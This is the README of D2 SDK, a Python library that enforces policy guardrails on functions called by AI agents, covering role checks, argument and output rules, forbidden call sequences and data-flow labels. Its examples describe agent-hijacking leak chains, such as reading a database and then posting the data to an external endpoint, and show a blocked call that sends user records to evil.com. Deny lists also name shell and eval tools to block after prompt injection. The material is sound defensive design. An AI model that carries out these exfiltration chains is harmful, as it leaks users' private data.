<div align="center">

<img src="./logo.png" alt="D2 SDK Logo" width="200" />

# D2 SDK

<h1>Check us out at https://artoo.love</h1>

### Deterministic Function-Level Guardrails for AI Agents

**Control what your AI can do—one function at a time.**

[![CI](https://img.shields.io/github/actions/workflow/status/artoo-corporation/D2-Python/ci.yml?label=CI)](https://github.com/artoo-corporation/D2-Python/actions/workflows/ci.yml)
![Python Versions](https://img.shields.io/badge/python-3.9%E2%80%933.12-blue)
![License](https://img.shields.io/badge/license-BUSL--1.1-blue)

[Documentation](https://www.artoo.love/documentation/full) • [Quickstart](https://www.artoo.love/documentation/quick-start)

<a href="https://www.linkedin.com/company/artoo-security"><img src="https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" alt="LinkedIn" /></a>
<a href="https://x.com/artoosec"><img src="https://img.shields.io/badge/X-000000?style=for-the-badge&logo=x&logoColor=white" alt="X/Twitter" /></a>
<a href="https://bsky.app/profile/artoosec.bsky.social"><img src="https://img.shields.io/badge/Bluesky-0285FF?style=for-the-badge&logo=bluesky&logoColor=white" alt="Bluesky" /></a>
<a href="https://substack.com/@artoodavid"><img src="https://img.shields.io/badge/Substack-FF6719?style=for-the-badge&logo=substack&logoColor=white" alt="Substack" /></a>
<a href="https://discord.gg/pzhUZzFR"><img src="https://img.shields.io/badge/Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white" alt="Discord" /></a>

</div>

---

## What is D2?

D2-SDK adds granular control to any function your LLM or application can call. Think of it as a security guard that sits in front of your Python functions, enforcing anything you outline in simple policy language based on YAML/JSON.


**What makes it useful:**

- Secure by default. If a tool isn't explicitly allowed in your policy, it gets blocked.
- Small surface area. One decorator, some user context, and you're done.
- Declarative guardrails. Set rules for arguments and return values in your policy file. D2 enforces them automatically.
- Built-in telemetry. Metrics and usage events are captured automatically. Problems with the exporter never crash your app.
- Works locally or in the cloud. Use local files for development, switch to signed cloud bundles for production.
- Catches typos early. Policy validation happens at load time, not when your app is running in production.

---

## Installation and setup

```bash
pip install "d2-sdk[all]"
```

Pick the initialization that matches your app type:

**For synchronous apps** (CLI scripts, Flask, Django):

```python
from d2 import configure_rbac_sync

configure_rbac_sync()  # Call this once at startup
```

**For async apps** (FastAPI, asyncio scripts):

```python
import d2, asyncio

async def lifespan():
    await d2.configure_rbac_async()  # Call this once at startup
```

**How modes work:**

- No `D2_TOKEN` set: Reads policy from a local file
- `D2_TOKEN` set: Uses signed bundles from the cloud with background updates

The examples in the `examples/` folder are interactive and use `print` and `input` for demonstration.

---

## API stability (version 1.0 and later)

The public API exported from `d2` follows semantic versioning. Breaking changes will bump the major version. These symbols are stable:

**Core functionality:**

- Decorator: `d2_guard` (also available as `d2`)
- RBAC setup: `configure_rbac_async`, `configure_rbac_sync`, `shutdown_rbac`, `shutdown_all_rbac`, `get_policy_manager`
- Context management: `set_user`, `set_user_context`, `get_user_context`, `clear_user_context`, `warn_if_context_set`
- Data flow: `record_fact`, `record_facts`, `get_facts`, `has_fact`, `has_any_fact`
- Web middleware: `ASGIMiddleware`, `headers_extractor`, `clear_context`, `clear_context_async`
- Error types: `PermissionDeniedError`, `MissingPolicyError`, `BundleExpiredError`, `TooManyToolsError`, `PolicyTooLargeError`, `InvalidSignatureError`, `ConfigurationError`, `D2PlanLimitError`, `D2Error`

---

## Protecting functions with the decorator

Put `@d2_guard("tool-id")` on any function that needs authorization checks.

Works with both regular functions and async functions. If you call a sync tool from inside an async context, D2 automatically runs it in a background thread so it doesn't block the event loop.

### Basic example with RBAC

```python
from d2 import d2_guard, set_user, configure_rbac_sync
from d2.exceptions import PermissionDeniedError

# Initialize D2 at startup
configure_rbac_sync()

@d2_guard("billing:read")
def read_billing():
    return {"balance": 1000, "currency": "USD"}

@d2_guard("analytics:run")
async def run_analytics():
    return await compute()

# Now use it in your application:
set_user("alice-123", roles=["viewer"])

try:
    data = read_billing()  
    # D2 checks: Does role "viewer" have permission for "billing:read"?
    # If policy allows it: function runs, returns data
    # If policy denies it: raises PermissionDeniedError before function runs
except PermissionDeniedError:
    # Tool was blocked by policy
    return {"error": "Access denied"}, 403
```

**What happens under the hood:**

1. User calls `read_billing()`
2. D2 intercepts the call (via the `@d2_guard` decorator)
3. D2 looks up the current user context (`alice-123` with role `viewer`)
4. D2 checks the policy: "Does `viewer` role have permission for `billing:read`?"
5. If YES: Function runs and returns data
6. If NO: Raises `PermissionDeniedError` (function never runs)

**Policy example:**

```yaml
policies:
  - role: viewer
    permissions:
      - billing:read  # Allowed
      # analytics:run not listed, so it's denied
  
  - role: admin
    permissions: ["*"]  # Wildcard allows everything
```

With this policy:
- `viewer` CAN call `read_billing()` (explicitly allowed)
- `viewer` CANNOT call `run_analytics()` (not in permission list)
- `admin` CAN call both (wildcard permission)

---

## Setting and clearing user context

D2 needs to know who the current user is and what roles they have. Set this once per request, then clear it when done.

### What you're telling D2

When you call `set_user("alice-123", roles=["analyst", "viewer"])`, you're telling D2:
- The current request is from user `alice-123`
- This user has roles `analyst` and `viewer`  
- Check the policy to see what tools these roles can access

**For sync handlers** (Flask, Django, etc.):

```python
from d2 import set_user, clear_context

@clear_context  # Automatically clears context after function returns
def view(request):
    # Your app's authentication already determined:
    # - request.user.id = "alice-123"
    # - request.user.roles = ["analyst", "viewer"]
    
    set_user(request.user.id, roles=request.user.roles)
    
    # Now D2 knows who's calling and will enforce their policy
    return read_billing()  # This checks: can analyst/viewer call billing:read?
```

**Manual pattern** (when not using decorators or middleware):

```python
from d2 import set_user, clear_user_context

def handle_request(req):
    try:
        set_user(req.user.id, roles=req.user.roles)
        return do_work()
    finally:
        clear_user_context()  # Always clear, even if exception occurs
```

**Why clearing matters:**

If you don't clear context, the next request might accidentally use the previous user's identity. Always use:
- `@clear_context` decorator, or
- `@clear_context_async` decorator, or  
- Manual `clear_user_context()` in a `finally` block

---

## Input and output guardrails (version 1.1+)

Two questions come up every time a tool gets called:

1. Should we run this with these arguments?
2. Is the data we're about to return safe to send?

D2 lets you answer both questions in your policy file. No extra code needed, just rules.

### Understanding guardrail rules

Before writing policies, understand what you can validate and how to reference data.

**Available constraint operators:**

These operators work for both input validation and output validation/sanitization:

| Operator | Purpose | Example | Works On |
|----------|---------|---------|----------|
| `type` | Check value type | `{type: int}`, `{type: string}` | Any value |
| `required` | Field must be present | `{required: true}` | Any field |
| `eq` | Exact match | `{eq: "admin"}`, `{eq: 100}` | String, number, bool |
| `ne` | Not equal to | `{ne: "guest"}` | String, number, bool |
| `min` | Minimum value | `{min: 1}` | Numbers |
| `max` | Maximum value | `{max: 1000}` | Numbers |
| `gt` | Greater than | `{gt: 0}` | Numbers |
| `lt` | Less than | `{lt: 100}` | Numbers |
| `in` | Must be in list | `{in: [sales, marketing]}` | String, number |
| `not_in` | Must not be in list | `{not_in: [sms, push]}` | String, number |
| `minLength` | Minimum length | `{minLength: 3}` | String, list |
| `maxLength` | Maximum length | `{maxLength: 50}` | String, list |
| `matches` | Regex pattern match | `{matches: "^[a-z_]+$"}` | String |
| `not_matches` | Regex must not match | `{not_matches: "(?i)password"}` | String |
| `contains` | String contains substring | `{contains: "@example.com"}` | String |
| `not_contains` | String must not contain | `{not_contains: "../"}` | String |
| `startsWith` | String starts with prefix | `{startsWith: "https://"}` | String |
| `endsWith` | String ends with suffix | `{endsWith: ".com"}` | String |
| `max_bytes` | Maximum byte size (UTF-8) | `{max_bytes: 10000}` | String, data |

**Important notes:**

- Operator names are case-sensitive (`minLength` not `minlength`)
- Multiple operators on the same field are AND conditions (all must pass)
- Unknown operators cause `ConfigurationError` at load time (fail fast, not at runtime)

**Data structures you can validate:**

D2 can inspect and validate any JSON-serializable value:

- **Simple values:** String, number, boolean
- **Dictionaries:** `{"name": "Alice", "age": 30}`
- **Lists:** `["item1", "item2", "item3"]`
- **Nested structures:** Any combination of the above

**Field path conventions:**

**For input validation:** Only top-level parameter names are supported. Each function parameter gets its own rule:

```yaml
input:
  user_id: {type: int, min: 1}      # Parameter name
  table: {in: [sales, marketing]}   # Parameter name
  limit: {min: 1, max: 1000}        # Parameter name
```

If you need nested validation, pass a dict parameter and validate the whole dict structure:

```python
@d2_guard("search")
def search(filters: dict):
    # D2 can validate that 'filters' is present and is a dict
    # But cannot validate filters.status with dot notation
    ...
```

**For output validation and sanitization:** Full dot notation is supported for nested structures.

Here's what the policy rules look like alongside the actual return values they operate on:

**Example 1: Simple top-level fields**

```python
# What your function returns:
return {"user_id": 42, "status": "active"}

# Policy rule:
output:
  user_id: {type: int, min: 1}       # Validates the "user_id" field
  status: {in: [active, pending]}     # Validates the "status" field
```

**Example 2: Nested fields (one level deep)**

```python
# What your function returns:
return {
    "user": {
        "email": "alice@example.com",
        "age": 30
    }
}

# Policy rule uses dot notation to reach nested fields:
output:
  user.email: {matches: "^[a-zA-Z0-9._%+-]+@.*"}  # Reaches into user → email
  user.age: {min: 18, max: 120}                    # Reaches into user → age
```

**Example 3: Lists of dicts (applies to ALL items)**

```python
# What your function returns:
return {
    "records": [
        {"name": "Alice", "ssn": "123-45-6789"},
        {"name": "Bob", "ssn": "987-65-4321"},
        {"name": "Carol", "ssn": "111-22-3333"}
    ]
}

# Policy rule targets fields in EVERY list item:
output:
  records.ssn: {action: filter}  # Removes "ssn" from ALL records
  
# What the caller receives after sanitization:
{
    "records": [
        {"name": "Alice"},      # ssn removed
        {"name": "Bob"},        # ssn removed
        {"name": "Carol"}       # ssn removed
    ]
}
```

**Example 4: Deeply nested (multiple levels)**

```python
# What your function returns:
return {
    "data": {
        "profile": {
            "settings": {
                "theme": "dark",
                "notifications": True
            }
        }
    }
}

# Policy rule uses chained dot notation:
output:
  data.profile.settings.theme: {in: [light, dark]}
  # Path: data → profile → settings → theme
  
# D2 walks the path step by step to find the value
```

**How path resolution works:**

When you write `user.email` in a policy, D2:
1. Looks for a field called `user` in the return value
2. Inside `user`, looks for a field called `email`
3. Applies the validation/sanitization rule to that value

For lists, `records.ssn` means:
1. Look for a field called `records`
2. If it's a list, apply the rule to the `ssn` field in EVERY item

**Writing functions for policy validation:**

**For outputs (full dot notation support):**

Return dicts with named fields so policies can use dot notation:

```python
# Good: Nested dicts let output policies target specific fields
@d2_guard("get_user")
def get_user(user_id: int):
    return {
        "name": "Alice",
        "profile": {"email": "alice@example.com", "age": 30}
    }
    # Output policy can use: profile.email, profile.age

# Avoid: Tuples can't be targeted by field name
@d2_guard("get_user")
def get_user(user_id: int):
    return ("Alice", "alice@example.com", 30)  # Policy can't distinguish fields
```

**For inputs (top-level parameters only):**

Since input validation only works on parameter names, structure your function signatures accordingly:

```python
# Good: Simple parameters are easy to validate
@d2_guard("search")
def search(table: str, limit: int, format: str):
    # Input policy can validate: table, limit, format
    ...

# Also fine: Dict parameter (validate as whole, not nested fields)
@d2_guard("create_record")
def create_record(data: dict):
    # Input policy can validate: data (presence, type)
    # But NOT data.title or data.priority (no dot notation)
    ...
```

D2 does not support ___ because ___
### Input rules (blocking bad arguments)

Input validation checks function arguments before execution. If any argument violates the policy, the call is blocked.

**Example:**

```yaml
policies:
  - role: analyst
    permissions:
      - tool: reports.generate
        allow: true
        conditions:
          input:
            table: {in: [analytics, dashboards]}
            row_limit: {min: 1, max: 1000}
            format: {matches: "^[a-z_]+$"}
```

```python
@d2_guard("reports.generate")
def generate(table: str, row_limit: int, format: str):
    # Only runs if arguments pass validation
    ...

# This works:
generate(table="analytics", row_limit=500, format="weekly_summary")

# These are blocked:
generate(table="engineering", row_limit=500, format="daily")  # table not in list
generate(table="analytics", row_limit=5000, format="daily")   # row_limit > 1000
generate(table="analytics", row_limit=100, format="Ad-Hoc")   # format has uppercase
```

Violations raise `PermissionDeniedError` (or trigger your `on_deny` handler) and telemetry records `reason="input_validation"`.

Because policies live outside your code, security teams can update them without waiting for a deployment

### Output rules (validating and cleaning responses)

D2 has two ways to handle output:

**1. Output validation (checking structure)**

This checks return values the same way input validation checks arguments. If validation fails, the whole response is blocked.

```yaml
policies:
  - role: analyst
    permissions:
      - tool: analytics.get_report
        allow: true
        conditions:
          output:
            status: {required: true, in: [success, error]}
            row_count: {type: int, min: 0, max: 10000}
            format: {type: string, in: [json, csv, xml]}
```

**What it does:**

- Uses constraint operators without the `action` keyword
- Blocks the entire response if anything violates the rules
- Works the same way as input validation
- Think: "Is this response structure valid?"

**2. Output sanitization (removing sensitive data)**

This transforms return values to remove or hide sensitive information. Happens after validation passes.

**Complete example** showing validation, sanitization, and what the caller receives:

Say your function returns customer data like this:

```python
@d2_guard("crm.lookup_customer")
def lookup_customer(customer_id: str):
    return {
        "status": "found",
        "name": "Alice Smith",
        "ssn": "123-45-6789",
        "salary": 150000,
        "notes": "VIP customer with SECRET clearance",
        "items": ["item1", "item2", ..., "item150"]  # 150 items
    }
```

You can sanitize this output with policy rules:

```yaml
policies:
  - role: support
    permissions:
      - tool: crm.lookup_customer
        allow: true
        conditions:
          output:
            # Validation (just checks, doesn't change anything)
            status: {required: true, in: [found, not_found]}
            
            # Sanitization rules (these transform the data)
            ssn: {action: filter}                        # Remove ssn field entirely
            salary: {max: 100000, action: redact}        # Redact if over 100k
            notes: {matches: "(?i)secret", action: deny} # Block response if "secret" found
            items: {maxLength: 100, action: truncate}    # Limit array to 100 items
            
            # Global rules
            max_bytes: 65536
            require_fields_absent: [internal_flag]
```

**What the caller receives after sanitization:**

```python
{
    "status": "found",        # Unchanged (passed validation)
    "name": "Alice Smith",    # Unchanged (no rule for this field)
    # ssn removed entirely (filter action)
    "salary": "[REDACTED]",   # Redacted because 150000 > 100000
    # Response BLOCKED before reaching caller (deny action triggered by "SECRET")
}
```

In this case, the whole response is blocked because `notes` matched the forbidden pattern. If `notes` didn't contain "SECRET", the caller would receive the data with `ssn` removed and `salary` redacted

**How it processes:**

1. Validate: Check constraints without `action` (block if violated)
2. Sanitize: Apply field actions (transform or block)
3. Return the cleaned result

**Field actions:**

- `action: filter`: Remove the field completely
- `action: redact`: Replace value with `[REDACTED]` (or use pattern substitution if `matches` is set)
- `action: deny`: Block the whole response if this field triggers
- `action: truncate`: Limit field size (needs `maxLength`)

Actions can be conditional (only trigger when a constraint is violated):

```yaml
salary: {max: 100000, action: redact}  # Only redact if over 100k
score: {type: int, max: 100, action: filter}  # Only remove if invalid or over 100
```

**Available constraint operators** (work for both input and output):

- `type`, `min`, `max`, `gt`, `lt`: Number and type checks
- `minLength`, `maxLength`: Size limits
- `in`, `not_in`: Allow and deny lists
- `matches`, `contains`, `startsWith`, `endsWith`: String pattern checks
- `eq`, `ne`, `required`: Equality and presence checks

**Important: Operator names are case-sensitive**

D2 rejects policies that have typos or unknown operators. This prevents silent failures where you think a rule is protecting your app but it's actually being ignored.

**Common mistakes D2 catches:**

| Wrong | Right |
|-------|-------|
| `minimum` | `min` |
| `maximum` | `max` |
| `minlength` or `minLenght` | `minLength` (capital L) |
| `maxlength` or `maxLenght` | `maxLength` (capital L) |
| `Type` or `MIN` | Lowercase (except Length) |

If you see a `ConfigurationError` about unknown operators, check the spelling. The error message suggests the correct operator.

**Global sanitization rules:**

- `deny_if_patterns`: Block if the cleaned output still matches forbidden patterns
- `require_fields_absent`: Block if forbidden fields exist anywhere in the response
- `max_bytes`: Set a size limit on the serialized output

**Key differences:**

| What | Validation | Sanitization |
|------|------------|--------------|
| Keyword | No `action` | Needs `action` |
| What happens | Blocks if violated | Changes data (or blocks if `action: deny`) |
| Changes value | Never | Always when triggered |
| Use for | "Is this valid?" | "Remove sensitive data" |

You can combine them however you want. If nothing triggers, the original value comes back unchanged. If a validation or deny rule triggers, D2 raises `PermissionDeniedError` (or runs your `on_deny` handler) with `reason="output_validation"` or `reason="output_sanitization"`. Telemetry records the same reason codes.

### Nested guards

Protected functions can safely call other protected functions. Each layer checks inputs and sanitizes outputs using the same user context. Inner responses get cleaned before outer functions see them.

Run `python examples/guardrails_demo.py` to see both types of guardrails in action. It uses the sample policy in `examples/guardrails_policy.yaml` to block bad inputs and sanitize outputs.

---

## Sequence enforcement (version 1.1+)

**What it does:** Stops dangerous patterns of tool calls, like reading from a database and then sending data to an external API.

Traditional RBAC only checks "who can call what." Sequence enforcement checks "what can be called after what." This prevents data leaks in systems where multiple agents work together.

### The problem

When multiple agents work together, attackers can trick one agent into misusing another agent's permissions. Research from Trail of Bits ([Multi-Agent System Hijacking](https://blog.trailofbits.com/2025/07/31/hijacking-multi-agent-systems-in-your-pajamas/)) shows common attack patterns:

- Direct data leak: `database.read` followed by `web.http_request`
- Secrets leak: `secrets.get_key` followed by `web.http_request`
- Hiding the trail: `database.read` then `analytics.process` then `web.http_request`

Traditional RBAC can't stop this because both operations are individually allowed. The sequence is what makes it dangerous.

### The solution

Define forbidden sequences in your policy:

```yaml
policies:
  - role: research_agent
    permissions:
      - database.read_users
      - web.http_request
      - analytics.summarize
    
    # Sequence enforcement
    sequence:
      # Block direct leaks
      - deny: ["database.read_users", "web.http_request"]
        reason: "Database access followed by external request may leak user data"
      
      # Block hiding the trail (3-step)
      - deny: ["database.read_users", "analytics.summarize", "web.http_request"]
        reason: "Data flow to external endpoints through analytics"
```

### How it works

D2 tracks which tools have been called in the current request using `contextvars`. Before running a protected function, it checks if the sequence would create a forbidden pattern.

**Execution layers:**

1. Layer 1 (RBAC): Can this role call this tool?
2. Layer 2 (Sequence): Does this call create a forbidden pattern?
3. Layer 3 (Input): Are these arguments safe?
4. Run the function
5. Layer 4 (Output): Is the return value safe?

**Example: Attack blocked**

```python
@d2_guard("database.read_users")
async def read_users():
    return [{"id": 1, "name": "Alice"}, {"id": 2, "name": "Bob"}]

@d2_guard("web.http_request")
async def send_request(url, data):
    return {"status": "sent"}

# Start of request
set_user("agent-1", roles=["research_agent"])

# Call 1: Read from database
users = await read_users()
# ✓ RBAC check passes (role has database.read_users permission)
# ✓ Sequence check passes (call history is empty, no pattern formed)
# ✓ Function runs
# D2's internal call history: ["database.read_users"]

# Call 2: Try to send data externally
await send_request("https://evil.com", users)
# ✓ RBAC check passes (role has web.http_request permission)
# ✗ Sequence check FAILS
#   Current history: ["database.read_users"]
#   Next tool: "web.http_request"
#   Pattern formed: ["database.read_users", "web.http_request"]
#   Policy says: deny this sequence
# ✗ Raises PermissionDeniedError with reason="sequence_violation"
# ✗ Function never runs, data never sent
```

**Example: Safe workflow allowed**

```python
@d2_guard("analytics.summarize")
async def summarize(data):
    return {"count": len(data)}

# Start of request (fresh context)
set_user("agent-2", roles=["research_agent"])

# Call 1: Process data internally
analytics = await summarize([1, 2, 3])
# ✓ Function runs
# Call history: ["analytics.summarize"]

# Call 2: Read from database
users = await read_users()
# ✓ Checking sequence: ["analytics.summarize", "database.read_users"]
# ✓ No policy rule blocks this pattern
# ✓ Function runs
# Call history: ["analytics.summarize", "database.read_users"]

# This is safe because:
# - No sensitive data went to external systems
# - Order matters: analytics THEN database (not database THEN external)
```

**What D2 tracks per request:**

```python
# Example internal state (you don't see this, D2 manages it)
{
    "user_id": "agent-1",
    "roles": ["research_agent"],
    "call_history": ["database.read_users"],  # Updated after each guarded call
    "request_id": "req-abc-123"  # For telemetry correlation
}
```

When the request ends (context cleared), the call history resets. Next request starts with an empty history

### What you get

- Request isolated: Call history gets cleared automatically between requests
- Admin bypass: Wildcard roles skip sequence checks
- Telemetry: Blocks are tagged with `reason="sequence_violation"`
- No code changes: Just update your policy file
- Memory efficient: Tool groups use lazy expansion, so large groups don't cause memory problems

### Scaling to large tool groups

For policies with many tools, use tool groups with lazy expansion to prevent memory exhaustion.

**The problem without groups:**

```yaml
# Without groups: Must list every combination explicitly
policies:
  - role: analyst
    sequence:
      - deny: ["database.read_users", "web.http_request"]
      - deny: ["database.read_users", "email.send"]
      - deny: ["database.read_users", "slack.post"]
      - deny: ["database.read_payments", "web.http_request"]
      - deny: ["database.read_payments", "email.send"]
      - deny: ["database.read_payments", "slack.post"]
      - deny: ["secrets.get_key", "web.http_request"]
      - deny: ["secrets.get_key", "email.send"]
      - deny: ["secrets.get_key", "slack.post"]
      # 3 sensitive × 3 external = 9 explicit rules
      # With 50 tools each: 50×50 = 2,500 rules!
```

**The solution with groups:**

```yaml
metadata:
  tool_groups:
    sensitive: [database.read_users, database.read_payments, secrets.get_key]
    external: [web.http_request, email.send, slack.post]

policies:
  - role: analyst
    sequence:
      # One rule covers all 9 combinations
      - deny: ["@sensitive", "@external"]
        reason: "Prevent data leaks through any external channel"
```

**How lazy expansion works at runtime:**

```python
# Policy has: deny: ["@sensitive", "@external"]

# Call 1
await read_users()  # Tool: database.read_users
# ✓ D2 updates history: ["database.read_users"]

# Call 2
await send_email("user@example.com", data)  # Tool: email.send
# D2 checks: Does ["database.read_users", "email.send"] match a forbidden pattern?
# 
# Step 1: Look at pattern ["@sensitive", "@external"]
# Step 2: Is "database.read_users" in @sensitive group? → YES (O(1) set lookup)
# Step 3: Is "email.send" in @external group? → YES (O(1) set lookup)
# Step 4: Pattern matches! → DENY
#
# No need to materialize all 9 combinations in memory
# Just check set membership at runtime
```

**Memory savings:**

| Scenario | Without Groups | With Groups |
|----------|----------------|-------------|
| 3×3 tools (2-hop) | 9 rules in memory | 1 rule + 2 sets (6 items) |
| 50×50 tools (2-hop) | 2,500 rules | 1 rule + 2 sets (100 items) |
| 50×50×50 (3-hop) | 125,000 rules | 1 rule + 3 sets (150 items) |

**Runtime performance:** O(1) set membership check per tool (fast regardless of group size)

### Try it

Run the demo to see it in action:

```bash
python examples/sequence_demo.py
```

It shows 5 scenarios:

1. Direct leak (blocked)
2. Safe internal workflow (allowed)
3. Hiding the trail (blocked)
4. Secrets leak (blocked)
5. Admin bypass (allowed)

For complete protection, combine RBAC, sequence enforcement, data flow tracking, and input/output guardrails. See the Trail of Bits research linked above for more attack patterns.

---

## Data flow tracking (version 1.2+)

**What it does:** Tracks semantic labels about what kind of data has entered a request, and blocks tools that shouldn't handle that data type.

Sequence enforcement blocks specific tool patterns. Data flow tracking provides blanket protection: "Once sensitive data enters the request, block ALL egress tools."

### The problem

Sequences can catch specific patterns like `[database.read, http.request]`, but attackers can pivot:

```python
# Blocked by sequence rule: [database.read, http.request]
users = await database.read()
await http.request(url, users)  # ✗ Blocked

# But attacker tries another channel...
users = await database.read()
await slack.post(channel, users)  # ✓ Allowed (no rule for this pattern)
await email.send(to, users)       # ✓ Allowed (no rule for this pattern)
```

You'd need to enumerate every possible egress tool in your sequence rules.

### The solution

Data flow tracking uses semantic labels:

```yaml
metadata:
  tool_groups:
    sensitive_data: [database.read, database.read_users, secrets.get]
    egress_tools: [http.request, email.send, slack.post, webhook.call]

  data_flow:
    labels:
      "@sensitive_data": [SENSITIVE]
      "@secrets": [SECRET]
      
    blocks:
      SENSITIVE: ["@egress_tools"]
      SECRET: ["@egress_tools", "logging.info"]
```

**What this means:**
- When any `@sensitive_data` tool runs, D2 adds the `SENSITIVE` label to the request
- Any tool in `@egress_tools` is blocked if `SENSITIVE` is present
- Labels persist for the entire request, regardless of intermediate tools

### How it works

```python
set_user("agent-1", roles=["researcher"])
# facts: {} (empty)

# Call 1: Read sensitive data
users = await database.read()
# facts: {"SENSITIVE"} ← label added after tool runs

# Call 2: Process internally (allowed - no blocking labels)
summary = await analytics.summarize(users)
# facts: {"SENSITIVE"} (unchanged)

# Call 3: Try ANY egress - all blocked
await http.request(url, summary)   # ✗ Blocked by SENSITIVE
await slack.post(channel, summary) # ✗ Blocked by SENSITIVE
await email.send(to, summary)      # ✗ Blocked by SENSITIVE
```

### Execution layers

D2 now runs 5 layers:

1. **RBAC**: Can this role call this tool?
2. **Input validation**: Are these arguments safe?
3. **Sequence enforcement**: Does this create a forbidden pattern?
4. **Data flow check**: Do current labels block this tool?
5. Run the function
6. **Output validation/sanitization**: Is the return value safe?
7. **Record labels**: Add any labels this tool produces

### Policy syntax

**Labels section:** Maps tools/groups to labels they produce:

```yaml
data_flow:
  labels:
    # Groups emit labels
    "@sensitive_data": [SENSITIVE]
    "@secret_sources": [SECRET]
    "@untrusted_inputs": [UNTRUSTED]
    "@llm_tools": [LLM_OUTPUT]
    
    # Individual tools can also emit
    "payment.process": [PCI_DATA, SENSITIVE]
```

**Blocks section:** Maps labels to tools they block:

```yaml
data_flow:
  blocks:
    SENSITIVE: ["@egress_tools"]
    SECRET: ["@egress_tools", "logging.info"]
    UNTRUSTED: ["@execution_tools"]
    LLM_OUTPUT: ["shell.execute", "code.eval"]
```

### Common use cases

**1. Compliance (PCI, GDPR, HIPAA):**

```yaml
data_flow:
  labels:
    "@pii_sources": [PII, GDPR]
    "@payment_tools": [PCI]
    
  blocks:
    PCI: ["logging.info", "@external_apis"]
    GDPR: ["@external_apis"]
```

**2. LLM output tainting (CaMeL-style):**

```yaml
data_flow:
  labels:
    "@llm_tools": [LLM_OUTPUT]
    
  blocks:
    LLM_OUTPUT: [shell.execute, code.eval, subprocess.run]
```

This prevents prompt injection → code execution attacks.

**3. Multi-agent data isolation:**

```yaml
data_flow:
  labels:
    "@user_input_tools": [UNTRUSTED]
    
  blocks:
    UNTRUSTED: ["@privileged_tools", "@write_tools"]
```

### Programmatic access

D2 exports functions for inspecting and manipulating facts:

```python
from d2 import get_facts, has_fact, has_any_fact, record_fact

# Check current labels
if has_fact("SENSITIVE"):
    log.warning("Handling sensitive data")

# Check for any of multiple labels
if has_any_fact(["PCI", "HIPAA", "GDPR"]):
    enable_audit_logging()

# Get all labels
print(get_facts())  # frozenset({'SENSITIVE', 'PII'})

# Manually record a label (rarely needed - usually from policy)
record_fact("CUSTOM_LABEL")
```

### Data flow vs sequences

| Feature | Sequences | Data Flow |
|---------|-----------|-----------|
| Blocks | Specific tool patterns | Any tool with matching label |
| Scope | "A then B is bad" | "Once X, block everything in group Y" |
| Pivot attacks | Need rules for each path | One label blocks all egress |
| Expression | Tool combinations | Data classifications |
| Best for | Known dangerous patterns | Blanket protection |

**Use both together:** Sequences for explicit patterns, data flow for blanket protection.

### Try it

Run the demo:

```bash
python examples/data_flow_demo.py
```

Shows:
1. Sensitive data blocking all egress tools
2. LLM output preventing code execution
3. Pivot attack prevention
4. Multi-label accumulation

---

## Multi-role policies (version 1.1+)

**What it does:** Multiple roles can share the same permissions, guardrails, and sequence rules in one policy block.

### The problem

When organizations have role tiers (analyst, senior_analyst, lead_analyst) or equivalent positions (data_engineer, ml_engineer, backend_engineer), traditional policies need the same rules copied for each role:

```yaml
# Old way: Copy everything
policies:
  - role: analyst
    permissions:
      - tool: database.read_users
        conditions: { ... }
    sequence: [ ... ]
  
  - role: senior_analyst
    permissions:
      - tool: database.read_users
        conditions: { ... }  # Same rules copied
    sequence: [ ... ]       # Same rules copied
```

This causes problems:

- Policy drift when you update one role but forget the others
- Hard to maintain as you add more roles
- Unclear if roles are actually supposed to be the same

### The solution

Use multi-role syntax to define rules once for multiple roles:

```yaml
# New way: Define once, apply to all
policies:
  # All analyst roles share these rules
  - role: ["analyst", "senior_analyst", "lead_analyst"]
    permissions:
      - tool: database.read_users
        allow: true
        conditions:
          output:
            ssn: {action: filter}
            salary: {action: filter}
    
    sequence:
      - deny: ["database.read_users", "web.http_request"]
        reason: "Prevent PII leaks"
```

### Syntax options

Three ways to write multi-role policies:

```yaml
# 1. Single role (works like before)
- role: "admin"
  permissions: ["*"]

# 2. Multiple roles (list with 'role' key)
- role: ["analyst", "senior_analyst", "lead_analyst"]
  permissions: [ ... ]

# 3. Alternative key (if you prefer 'roles' plural)
- roles: ["contractor", "intern", "guest"]
  permissions: [ ... ]
```

### What you get

- DRY principle: Write once, apply to multiple roles
- Easier updates: Change one block, all roles update
- Clear intent: Shows which roles are equivalent
- Works everywhere: RBAC, guardrails, and sequences all support it
- Backwards compatible: Old single-role syntax still works

### Common use cases

1. **Role tiers:** `["analyst", "senior_analyst", "lead_analyst"]` - Same access, different seniority levels
2. **Engineering teams:** `["data_engineer", "ml_engineer", "backend_engineer"]` - Equivalent technical roles
3. **Limited access:** `["contractor", "intern", "guest"]` - Restricted permissions for temporary users
4. **Service accounts:** `["integration_service_prod", "integration_service_staging", "integration_service_dev"]` - Same rules across environments

### Try it

See it in action:

```bash
python examples/multi_role_demo.py
```

Shows:

- Multiple analyst roles sharing output sanitization
- Engineering teams with shared sequence enforcement
- Limited-access users with the same restrictions
- Service accounts with consistent permissions across environments

Check out `examples/multi_role_policy.yaml` for a complete policy example.

---

## Creating and iterating on policies locally

Create a local policy without needing a cloud account:

```bash
python -m d2 init --path ./your_project
```

This scans your code for `@d2_guard` and creates a starter policy at:

- `${XDG_CONFIG_HOME:-~/.config}/d2/policy.yaml` by default

The SDK looks for policies in this order:

1. `D2_POLICY_FILE` (explicit path you set)
2. `~/.config/d2/policy.yaml` (or XDG config directory)
3. `./policy.yaml` or `.yml` or `.json` (current directory)

**Example policy:**

```yaml
metadata:
  name: "your-app-name"
  description: "Optional description"
  expires: "2025-12-01T00:00:00+00:00"
policies:
  - role: admin
    permissions: ["*"]
  - role: developer
    permissions:
      - "billing:read"
      - "analytics:run"
```

**Using it in code:**

```python
from d2.exceptions import PermissionDeniedError

try:
    read_billing()
except PermissionDeniedError:
    # Handle it: return HTTP 403, use fallback, etc.
    ...
```

---

## Moving to cloud mode

When you're ready, add your token and keep the same code:

```bash
export D2_TOKEN=d2_...
```

**Setup is the same:**

```python
await d2.configure_rbac_async()  # Same call as local mode
```

**What happens:**

- The SDK polls `/v1/policy/bundle` with ETag support for efficient caching
- You get instant revocation, versioning, quotas, and metrics
- JWKS rotation is automatic (the server tells the SDK when to refresh keys)
- Plan and app limits are shown clearly:
  - 402 errors become `D2PlanLimitError`
  - 403 with `detail: quota_apps_exceeded` means you need to upgrade or delete unused apps

**Publishing from CLI:**

```bash
python -m d2 publish ./policy.yaml  # Generates key and signs automatically
```

**Key management:**

- Keys are registered automatically on first publish and reused after that
